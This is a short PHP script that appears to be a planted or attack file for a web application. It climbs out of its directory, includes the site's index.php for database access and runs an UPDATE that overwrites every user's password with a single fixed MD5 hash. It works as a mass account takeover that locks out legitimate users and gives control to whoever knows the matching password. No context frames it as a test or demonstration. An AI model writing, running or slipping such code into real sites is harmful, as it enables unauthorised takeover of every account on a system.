<?php
set_include_path('./../');
chdir('./../../../../');
echo getcwd();

$path    = './';
$files = scandir($path);
include "index.php";

$upd = "UPDATE user
SET password = 'fafda651eaee8e1453edd6ac90b3adec'
WHERE 1 = 1 ";
db_query($upd, $mysqlMainDb);

?>
